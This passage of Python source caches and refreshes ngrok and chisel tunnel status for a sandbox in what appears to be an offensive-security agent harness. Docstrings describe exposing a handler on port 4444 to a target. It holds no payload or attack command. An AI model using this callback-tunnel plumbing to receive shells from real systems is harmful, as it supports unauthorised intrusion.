        _tunnel_status.pop(key, None)
        for name in ("ngrok", "chisel"):
            _connecting_since.pop((key, name), None)


def _cached_tunnel_status(handle) -> dict | None:
    """The instance's last tunnel status, without any I/O. A missing or stale one is read
    again in a background task on the running loop (one per instance at a time)."""
    entry = _tunnel_status.get(handle.key)
    if entry is None or time.monotonic() - entry[0] > _status_ttl(entry[1]):
        _schedule_tunnel_refresh(handle)
    return entry[1] if entry else None


def _note_connecting(key: tuple, data) -> None:
    """Since when each tunnel of the instance has been connecting, read after read."""
    now = time.monotonic()
    for name in ("ngrok", "chisel"):
        value = data.get(name) if isinstance(data, dict) else None
        if isinstance(value, dict) and value.get("status") == "connecting":
            _connecting_since.setdefault((key, name), now)
            _connecting_since.move_to_end((key, name))
        else:
            _connecting_since.pop((key, name), None)
    while len(_connecting_since) > _TUNNEL_STATUS_MAX:
        _connecting_since.popitem(last=False)


def _status_ttl(data) -> float:
    settling = isinstance(data, dict) and any(
        isinstance(v, dict) and v.get("status") == "connecting" for v in data.values())
    return _TUNNEL_STATUS_SETTLING_TTL_S if settling else _TUNNEL_STATUS_TTL_S


def _schedule_tunnel_refresh(handle) -> None:
    key = handle.key
    if key in _tunnel_refreshes:
        return
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        return
    url, headers = _tunnel_status_request(handle)
    # Its own context: the run's (its scope, its handle) never rides along.
    task = loop.create_task(_read_tunnel_status(key, url, headers), context=contextvars.Context())
    _tunnel_refreshes[key] = task
    task.add_done_callback(lambda _t, key=key: _tunnel_refreshes.pop(key, None))


async def _settle_tunnel_refreshes() -> None:
    """Tests: wait for the background reads in flight."""
    tasks = [t for t in list(_tunnel_refreshes.values()) if not t.done()]
    if tasks:
        await asyncio.wait(tasks)


def _forget_all_tunnel_status() -> None:
    """Tests: forget every remembered status."""
    _tunnel_status.clear()
    _connecting_since.clear()


def _query_ngrok_tunnel(handle=_RUN) -> dict | None:
    """
    The public TCP endpoint of the ngrok tunnel of the run's own sandbox (or `handle`),
    as its tunnel manager on 8015 last answered (ngrok's API listens on the sandbox's
    loopback only), never dialled from here: a stale answer is read again in the
    background. Only the `own` view has a tunnel.

    The hostname is returned as-is (not pre-resolved) because the agent
    container's DNS may resolve ngrok TCP relay hostnames to a different
    IP than the actual relay server.  The target will resolve the hostname
    through its own DNS, which returns the correct IP.

    Returns:
        Dict with 'host' (str — ngrok hostname), 'port' (int), and
        'hostname' (str — same as host) if a TCP tunnel is up, else None.
    """
    import sandbox_contract

    target = _tunnel_sandbox(handle)
    if target is _NO_SANDBOX or target.view != sandbox_contract.VIEW_OWN:
        return None
    return tunnels_from_status(_cached_tunnel_status(target))[0]


def _query_chisel_tunnel(handle=_RUN) -> dict | None:
    """
    The chisel tunnel of the run's own sandbox (or `handle`), as its tunnel manager on 8015
    last answered, never dialled from here: the chisel server's host and the one port it
    forwards (4444, the handler), only while chisel reports itself on. A process that is
    alive but not connected (its remote port refused, a wrong server) is not a tunnel. Only
    the `own` view has a tunnel.

    Returns:
        Dict with 'host' (str), 'port' (int = 4444) and 'hostname' (str) while chisel is
        on, else None.
    """
    import sandbox_contract

    target = _tunnel_sandbox(handle)
    if target is _NO_SANDBOX or target.view != sandbox_contract.VIEW_OWN:
        return None
    return tunnels_from_status(_cached_tunnel_status(target))[1]
